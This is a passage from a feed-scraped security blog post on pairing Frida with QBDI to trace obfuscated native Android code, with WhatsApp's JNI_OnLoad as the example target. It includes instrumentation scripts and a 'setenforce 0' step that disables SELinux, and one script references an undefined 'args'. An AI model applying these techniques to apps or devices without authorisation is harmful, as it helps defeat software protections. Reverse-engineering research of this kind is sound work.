+0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/mordor2.jpg","linkMd5":"430ebf87a477d97a275d0e53eefc4064","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn44@2020_1/2020/08/25/01-15-09-144_f6b83c4ba2bd1686.webp","destWidth":1164,"destHeight":480,"sourceBytes":111595,"destBytes":55270,"author":"Paul Hernault","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/mordor2.jpg":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn44@2020_1/2020/08/25/01-15-09-144_f6b83c4ba2bd1686.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/encodings.jpg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn100@2020_1/2020/08/25/01-15-12-530_0681ca6487dfb984.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn16@2020_1/2020/08/25/01-15-14-129_d23e1f0e0af62f65.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_new.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn11@2020_6/2020/08/25/01-15-15-520_37b5ead4689100bc.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_new1.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn95@2020_6/2020/08/25/01-15-13-420_cd934934bb6b4eea.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES5.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn20@2020_3/2020/08/25/01-15-15-442_430f83c02d2e3efc.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES6.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn32@2020_2/2020/08/25/01-15-16-212_4d278d28ff248a14.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES7.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn91@2020_4/2020/08/25/01-15-14-036_64e91f616bf075ef.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_xx.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn24@2020_2/2020/08/25/01-15-19-020_05aff9d52b81f3c1.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_zz.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn40@2020_2/2020/08/25/01-15-14-110_2088f734e9717d05.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/too_many_keys.jpg":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn72@2020_5/2020/08/25/01-15-14-738_7e00042d784d61db.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES8.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn75@2020_4/2020/08/25/01-15-17-467_9a7fb1617a321a1d.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES9.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn58@2020_4/2020/08/25/01-15-17-140_bee376bbacce6c60.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES10.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn78@2020_6/2020/08/25/01-15-13-613_ece9a2f5de9f6d0f.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/kd_1.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn52@2020_6/2020/08/25/01-15-16-862_b472f58b5e61aedd.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/kd_0.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn43@2020_6/2020/08/25/01-15-13-340_87fa83c3bcacf546.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/read.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn8@2020_6/2020/08/25/01-15-13-265_6d96ee46d0497c0e.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/stack_write.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn92@2020_2/2020/08/25/01-15-13-325_41d8c7b67f1f7e07.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/E_r0.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn11@2020_6/2020/08/25/01-15-12-678_47f80bfbf18c2289.webp","http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/goupix-wb.jpg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn83@2020_5/2020/08/25/01-15-12-680_a11ce90513902d93.webp"},"publishedOrCreatedDate":1598318092725},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Why are Frida and QBDI a Great Blend on Android?","link":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html","description":"<script src=\"resources/2020-08-04-why-are-frida-and-qbdi-a-great-blend-on-android/asciinema-player.js\"></script> \n<link rel=\"stylesheet\" href=\"resources/2020-08-04-why-are-frida-and-qbdi-a-great-blend-on-android/asciinema-player.css\" /> \n<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>Reverse engineering of Android applications is usually considered as somewhat effortless because of the possibility of retrieving the Java representation of the application's code. An attacker is basically able to read through a human-readable version of the code in order to quickly extract the intellectual property, gather some assets, find vulnerabilities and so on. Nowadays, most of the Android application editors are aware of this weakness and try their best to make reverse engineers' work harder. They often rely on integrating obfuscation strategies or shifting sensitive features from Java/Kotlin side to native code thanks to Java Native Interface (shortened JNI <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id18\" id=\"id1\">[1]</a>). However, the reverse engineering process gets much more complex when they decide to use both — that is, obfuscated native code. As a result, statically looking into the native library's disassembly turns out to be pretty tedious and time-consuming. Fortunately, inspection at runtime is still possible and offers a convenient way to efficiently grasp the inner mechanisms of the application, even over obfuscation.</p> \n <p>Since protections against regular debuggers are quite common among popular applications, using a Dynamic Binary Instrumentation (DBI) framework such as Frida <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id19\" id=\"id2\">[2]</a> remains a great option for a thorough examination. Technically speaking, amongst other powerful features, Frida allows users to inject their own code at the beginning and the end of a native function or replace the whole implementation. Nonetheless, Frida lacks granularity at some point, especially when it comes to inspecting the execution at the instruction scale. In this context, QBDI, a DBI framework we have developed at Quarkslab, can give Frida a hand determining what parts of the code have been executed when calling a given native function.</p> \n <p>This article is the follow-up of the talk that has been given at Pass The Salt 2020. Video <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id20\" id=\"id3\">[3]</a> and slide deck <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id21\" id=\"id4\">[4]</a> are available online.</p> \n</div> \n<div class=\"section\" id=\"getting-started\"> \n <h2>Getting started</h2> \n <p>First of all, we have to properly set our testing environment up. We assume that the device has been rooted and Frida server is already running and ready for use. Besides Frida, we need QBDI to be installed as well. We can either compile it from sources <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id22\" id=\"id5\">[5]</a> or download a release build for Android. Archives can be retrieved directly from the official page <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id23\" id=\"id6\">[6]</a>. After decompressing, we have to push the shared library called <tt class=\"docutils literal\">libQBDI.so</tt> on the device, in <tt class=\"docutils literal\">/data/local/tmp</tt>. Along with it, we can also notice the QBDI bindings defined in <tt class=\"docutils literal\"><span class=\"pre\">frida-qbdi.js</span></tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id24\" id=\"id7\">[7]</a> — this file is responsible for providing an interface over QBDI functions. In other words, it acts as a bridge between QBDI and Frida.</p> \n <p>Note that SELinux has to be turned off beforehand otherwise Frida won't be able to load the QBDI shared library into memory due to some restriction rules. An explicit error message would show up, telling that permissions are denied. In most cases, merely running this command line with root privileges should do the job:</p> \n <div class=\"highlight\"> \n  <pre><span></span>setenforce <span class=\"m\">0</span>\n</pre> \n </div> \n <p>We now have all the requirements for writing a script based on both Frida and QBDI.</p> \n</div> \n<div class=\"section\" id=\"tracing-a-native-function\"> \n <h2>Tracing a native function</h2> \n <p><tt class=\"docutils literal\">JNI_OnLoad()</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id25\" id=\"id8\">[8]</a> is always worth examining while performing reverse engineering on JNI shared libraries. Indeed, this function is called right after the library loading and is responsible for initialisation. It is able to interact with the Java side such as setting class' attributes, calling Java functions and registering other native methods through several JNI functions <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id26\" id=\"id9\">[9]</a>. Editors often rely upon these properties for hiding some sensitive checks and secret inner mechanisms.</p> \n <p>In this part, let's pretend we would like to analyse a popular Android application — say Whatsapp <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id27\" id=\"id10\">[10]</a>, whose package name is <tt class=\"docutils literal\">com.whatsapp</tt>, which is currently the most widespread instant-messaging solution on Android. It embeds a bunch of shared libraries, one of which is <tt class=\"docutils literal\">libwhatsapp.so</tt>. Note that this library doesn't lie in the conventional <tt class=\"docutils literal\">lib/</tt> directory as there's a decompression mechanism at runtime which extracts it from an archive and then loads it into memory. We're aiming at figuring out what its initialisation function is doing.</p> \n <div class=\"section\" id=\"frida-only\"> \n  <h3>Frida only</h3> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"cm\">/**</span>\n<span class=\"cm\"> * frida -Uf com.whatsapp --no-pause -l script.js</span>\n<span class=\"cm\"> */</span>\n\n<span class=\"kd\">function</span> <span class=\"nx\">processJniOnLoad</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">funcSym</span> <span class=\"o\">=</span> <span class=\"s2\">\"JNI_OnLoad\"</span><span class=\"p\">;</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">funcPtr</span> <span class=\"o\">=</span> <span class=\"nx\">Module</span><span class=\"p\">.</span><span class=\"nx\">findExportByName</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">,</span> <span class=\"nx\">funcSym</span><span class=\"p\">);</span>\n\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Hooking \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcSym</span> <span class=\"o\">+</span> <span class=\"s2\">\"() @ \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcPtr</span> <span class=\"o\">+</span> <span class=\"s2\">\"...\"</span><span class=\"p\">);</span>\n    <span class=\"c1\">// jint JNI_OnLoad(JavaVM *vm, void *reserved);</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">funcHook</span> <span class=\"o\">=</span> <span class=\"nx\">Interceptor</span><span class=\"p\">.</span><span class=\"nx\">attach</span><span class=\"p\">(</span><span class=\"nx\">funcPtr</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n        <span class=\"nx\">onEnter</span><span class=\"o\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"kr\">const</span> <span class=\"nx\">vm</span> <span class=\"o\">=</span> <span class=\"nx\">args</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n            <span class=\"kr\">const</span> <span class=\"nx\">reserved</span> <span class=\"o\">=</span> <span class=\"nx\">args</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n            <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+] \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcSym</span> <span class=\"o\">+</span> <span class=\"s2\">\"(\"</span> <span class=\"o\">+</span> <span class=\"nx\">vm</span> <span class=\"o\">+</span> <span class=\"s2\">\", \"</span> <span class=\"o\">+</span> <span class=\"nx\">reserved</span> <span class=\"o\">+</span> <span class=\"s2\">\") called\"</span><span class=\"p\">);</span>\n        <span class=\"p\">},</span>\n        <span class=\"nx\">onLeave</span><span class=\"o\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">retval</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+]\\t= \"</span> <span class=\"o\">+</span> <span class=\"nx\">retval</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">});</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">function</span> <span class=\"nx\">waitForLibLoading</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">isLibLoaded</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n\n    <span class=\"nx\">Interceptor</span><span class=\"p\">.</span><span class=\"nx\">attach</span><span class=\"p\">(</span><span class=\"nx\">Module</span><span class=\"p\">.</span><span class=\"nx\">findExportByName</span><span class=\"p\">(</span><span class=\"kc\">null</span><span class=\"p\">,</span> <span class=\"s2\">\"android_dlopen_ext\"</span><span class=\"p\">),</span> <span class=\"p\">{</span>\n        <span class=\"nx\">onEnter</span><span class=\"o\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"kd\">var</span> <span class=\"nx\">libraryPath</span> <span class=\"o\">=</span> <span class=\"nx\">Memory</span><span class=\"p\">.</span><span class=\"nx\">readCString</span><span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]);</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">libraryPath</span><span class=\"p\">.</span><span class=\"nx\">includes</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n                <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Loading library \"</span> <span class=\"o\">+</span> <span class=\"nx\">libraryPath</span> <span class=\"o\">+</span> <span class=\"s2\">\"...\"</span><span class=\"p\">);</span>\n                <span class=\"nx\">isLibLoaded</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n        <span class=\"p\">},</span>\n        <span class=\"nx\">onLeave</span><span class=\"o\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">args</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">isLibLoaded</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"nx\">processJniOnLoad</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">);</span>\n                <span class=\"nx\">isLibLoaded</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">});</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">Java</span><span class=\"p\">.</span><span class=\"nx\">perform</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">libraryName</span> <span class=\"o\">=</span> <span class=\"s2\">\"libwhatsapp.so\"</span><span class=\"p\">;</span>\n    <span class=\"nx\">waitForLibLoading</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</pre> \n  </div> \n  <p>First, thanks to the convenient API Frida provides, we can easily hook the function we want to look into. However, since libraries embedded within Android applications are dynamically loaded through <tt class=\"docutils literal\">System.loadLibrary()</tt>, which calls native <tt class=\"docutils literal\">android_dlopen_ext()</tt> under the hood, we need to wait for the targeted library to be put into the process' memory. Using this script, we can solely access the inputs (arguments) and output (return value) of the function — that is, we're at the function layer. It's quite limiting and this alone is basically not enough to accurately grasp what's going on inside. Therefore, in this precise situation, we would like to inspect the function thoroughly, at a lower level.</p> \n </div> \n <div class=\"section\" id=\"frida-qbdi\"> \n  <h3>Frida + QBDI</h3> \n  <p>Importing features offered by QBDI can help us overcome this issue. Indeed, this DBI framework allows users to perform a fine-grained analysis by tracing executed instructions. It is pretty useful for us because we could have an in-depth understanding of the function we're targeting.</p> \n  <p>The idea is, instead of letting <tt class=\"docutils literal\">JNI_OnLoad()</tt> run as during a regular startup, to execute it through an instrumented context in order to know exactly what has been executed, at the basic block/instruction scale. Since we can combine these two DBI frameworks together, this brand-new part can be integrated on top of the Frida script we have written previously.</p> \n  <p>However, the <tt class=\"docutils literal\">Interceptor.attach()</tt> function we're using solely lets us define <tt class=\"docutils literal\">onEnter</tt> and <tt class=\"docutils literal\">onLeave</tt> callbacks. It means that the genuine function is always executed, regardless of what your entry callback is supposed to do. Thus, the initialisation function will be executed <strong>twice</strong> — first through QBDI and then normally. It turns out to be problematic because depending on the case, some unexpected runtime errors could show up as this function is intended to be called once.</p> \n  <p>Fortunately, we can take advantage of another feature brought by Frida's <tt class=\"docutils literal\">Interceptor</tt> module which consists of replacing the implementation of a native function. Doing so, we are able to set up the QBDI context, execute the instrumented function and seamlessly forward the return value to the caller as usual to prevent the application from crashing. This technique aims to keep the process stable enough to resume the normal execution.</p> \n  <p>Nevertheless, we're still facing a problem here: the initial function has been completely overridden by our own new implementation. In other words, the function's code is not the original one — it has been instrumented by Frida earlier. Within our code, we must thus revert to the genuine version before executing the function with QBDI.</p> \n  <p>After modifying the script, the <tt class=\"docutils literal\">processJniOnLoad()</tt> function looks as follows:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kd\">function</span> <span class=\"nx\">processJniOnLoad</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">funcSym</span> <span class=\"o\">=</span> <span class=\"s2\">\"JNI_OnLoad\"</span><span class=\"p\">;</span>\n    <span class=\"kr\">const</span> <span class=\"nx\">funcPtr</span> <span class=\"o\">=</span> <span class=\"nx\">Module</span><span class=\"p\">.</span><span class=\"nx\">findExportByName</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">,</span> <span class=\"nx\">funcSym</span><span class=\"p\">);</span>\n\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Replacing \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcSym</span> <span class=\"o\">+</span> <span class=\"s2\">\"() @ \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcPtr</span> <span class=\"o\">+</span> <span class=\"s2\">\"...\"</span><span class=\"p\">);</span>\n    <span class=\"c1\">// jint JNI_OnLoad(JavaVM *vm, void *reserved);</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">replacement</span> <span class=\"o\">=</span> <span class=\"nx\">Interceptor</span><span class=\"p\">.</span><span class=\"nx\">replace</span><span class=\"p\">(</span><span class=\"nx\">funcPtr</span><span class=\"p\">,</span> <span class=\"k\">new</span> <span class=\"nx\">NativeCallback</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">vm</span><span class=\"p\">,</span> <span class=\"nx\">reserved</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kr\">const</span> <span class=\"nx\">vm</span> <span class=\"o\">=</span> <span class=\"nx\">args</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n        <span class=\"kr\">const</span> <span class=\"nx\">reserved</span> <span class=\"o\">=</span> <span class=\"nx\">args</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"[+] \"</span> <span class=\"o\">+</span> <span class=\"nx\">funcSym</span> <span class=\"o\">+</span> <span class=\"s2\">\"(\"</span> <span class=\"o\">+</span> <span class=\"nx\">vm</span> <span class=\"o\">+</span> <span class=\"s2\">\", \"</span> <span class=\"o\">+</span> <span class=\"nx\">reserved</span> <span class=\"o\">+</span> <span class=\"s2\">\") called\"</span><span class=\"p\">);</span>\n        <span class=\"nx\">Interceptor</span><span class=\"p\">.</span><span class=\"nx\">revert</span><span class=\"p\">(</span><span class=\"nx\">funcPtr</span><span class=\"p\">);</span> <span class=\"c1\">// revert to the genuine implementation</span>\n        <span class=\"nx\">Interceptor</span><span class=\"p\">.</span><span class=\"nx\">flush</span><span class=\"p\">();</span> <span class=\"c1\">// ensure changes have been actually committed</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">retVal</span> <span class=\"o\">=</span> <span class=\"nx\">qbdiExec</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">context</span><span class=\"p\">,</span> <span class=\"nx\">funcPtr</span><span class=\"p\">,</span> <span class=\"nx\">funcSym</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"nx\">vm</span><span class=\"p\">,</span> <span class=\"nx\">reserved</span><span class=\"p\">],</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n        <span class=\"nx\">processJniOnLoad</span><span class=\"p\">(</span><span class=\"nx\">libraryName</span><span class=\"p\">,</span> <span class=\"nx\">funcSym</span><span class=\"p\">);</span> <span class=\"c1\">// replace the implementation again for a potential call later on</span>\n        <span class=\"k\">return</span> <span class=\"nx\">retVal</span><span class=\"p\">;</span>\n    <span class=\"p\">},</span> <span class=\"s2\">\"long\"</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"s2\">\"pointer\"</span><span class=\"p\">,</span> <span class=\"s2\">\"pointer\"</span><span class=\"p\">]));</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <div class=\"section\" id=\"initialisation\"> \n   <h4>Initialisation</h4> \n   <p>Let's now write the function responsible for executing the function in the context of QBDI. In the first place, we need to initialise a VM, instantiate its related state (General Purpose Registers) and allocate a fake stack which will be used during the execution of the function. Then, we have to synchronise QBDI's context with the current one — that is, put the value of the real CPU registers into those QBDI will work with. We can now decide upon what parts of the code to instrument. We can either explicitly define an arbitrary address range or ask the DBI to instrument the whole address space of the module the function address is located in. For convenience's sake, we will go for the latter in this example.</p> \n  </div> \n  <div class=\"section\" id=\"callback-function-setting-up\"> \n   <h4>Callback function setting up</h4> \n   <p>We have to specify the sort of callback function we want. Here, we would like to trace every single instruction that has been executed so I'm placing a <em>pre-instruction</em> code callback. It means that my function will be called <strong>before</strong> each executed instruction which lies in my targeted module.</p> \n   <p>In addition, we can also add a couple of event callback functions to be notified whenever the execution is transferred to or returned back from a part of the code that isn't instrumented by QBDI. It's quite useful when the code interacts with some other modules such as system libraries (<tt class=\"docutils literal\">libc.so</tt>, <tt class=\"docutils literal\">libart.so</tt>, <tt class=\"docutils literal\">libbinder.so</tt>, etc.). Note that depending on what you want to monitor, several other callback types may be pretty helpful.</p> \n  </div> \n  <div class=\"section\" id=\"function-call\"> \n   <h4>Function call</h4> \n   <p>We're now ready to call the targeted function through QBDI. Of course, we need to pass the expected arguments which are in our case, a pointer to a <tt class=\"docutils literal\">JavaVM</tt> object and a null pointer. Afterwards, we can retrieve the return value according to the used calling convention, either on a specific QBDI register or on the virtual stack. This value has to be forwarded and returned from the native replacement function we have written before. Otherwise, the application will be likely to stop running due to an unsatisfied check on the JNI version which is supposed to be returned by <tt class=\"docutils literal\">JNI_OnLoad()</tt>.</p> \n   <p>We can optionally restore the genuine CPU context with the QBDI's one.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"kr\">const</span> <span class=\"nx\">qbdi</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s2\">\"/path/to/frida-qbdi\"</span><span class=\"p\">);</span>\n<span class=\"nx\">qbdi</span><span class=\"p\">.</span><span class=\"kr\">import</span><span class=\"p\">();</span>\n\n<span class=\"kd\">function</span> <span class=\"nx\">qbdiExec</span><span class=\"p\">(</span><span class=\"nx\">ctx</span><span class=\"p\">,</span> <span class=\"nx\">funcPtr</span><span class=\"p\">,</span> <span class=\"nx\">funcSym</span><span class=\"p\">,</span> <span class=\"nx\">args</span><span class=\"p\">,</span> <span class=\"nx\">postSync</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">vm</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">QBDI</span><span class=\"p\">();</span> <span class=\"c1\">// create a QBDI VM</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">state</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">getGPRState</span><span class=\"p\">();</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">stack</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">allocateVirtualStack</span><span class=\"p\">(</span><span class=\"nx\">state</span><span class=\"p\">,</span> <span class=\"mh\">0x10000</span><span class=\"p\">);</span> <span class=\"c1\">// allocate a virtual stack</span>\n    <span class=\"nx\">state</span><span class=\"p\">.</span><span class=\"nx\">synchronizeContext</span><span class=\"p\">(</span><span class=\"nx\">ctx</span><span class=\"p\">,</span> <span class=\"nx\">SyncDirection</span><span class=\"p\">.</span><span class=\"nx\">FRIDA_TO_QBDI</span><span class=\"p\">);</span> <span class=\"c1\">// set up QBDI's context</span>\n\n    <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">addInstrumentedModuleFromAddr</span><span class=\"p\">(</span><span class=\"nx\">funcPtr</span><span class=\"p\">);</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">icbk</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">newInstCallback</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">vm</span><span class=\"p\">,</span> <span class=\"nx\">gpr</span><span class=\"p\">,</span> <span class=\"nx\">fpr</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">inst</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">getInstAnalysis</span><span class=\"p\">();</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"0x\"</span> <span class=\"o\">+</span> <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">address</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span> <span class=\"o\">+</span> <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">disassembly</span><span class=\"p\">);</span>\n        <span class=\"k\">return</span> <span class=\"nx\">VMAction</span><span class=\"p\">.</span><span class=\"nx\">CONTINUE</span><span class=\"p\">;</span>\n    <span class=\"p\">});</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">iid</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">addCodeCB</span><span class=\"p\">(</span><span class=\"nx\">InstPosition</span><span class=\"p\">.</span><span class=\"nx\">PREINST</span><span class=\"p\">,</span> <span class=\"nx\">icbk</span><span class=\"p\">);</span> <span class=\"c1\">// register pre-instruction callback</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">vcbk</span> <span class=\"o\">=</span> <span class=\"nx\">vm</span><span class=\"p\">.</span><span class=\"nx\">newVMCallback</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">vm</span><span class=\"p\">,</span> <span class=\"nx\">evt</span><span class=\"p\">,</span> <span class=\"nx\">gpr</span><span class=\"p\">,</span> <span class=\"nx\">fpr</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kr\">const</span> <span class=\"nx\">module</span> <span class=\"o\">=</span> <span class=\"nx\">Process</span><span class=\"p\">.</span><span class=\"nx\">getModuleByAddress</span><span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockStart</span><span class=\"p\">);</span>\n        <span class=\"kr\">const</span> <span class=\"nx\">offset</span> <span class=\"o\">=</span> <span class=\"nx\">ptr</span><span class=\"p\">(</span><span class=\"nx\">evt</span><span class=\"p\">.</span><span class=\"nx\">basicBlockStart</span> <span class=\"o\">-</span> <span class=\"nx\">module</span><span 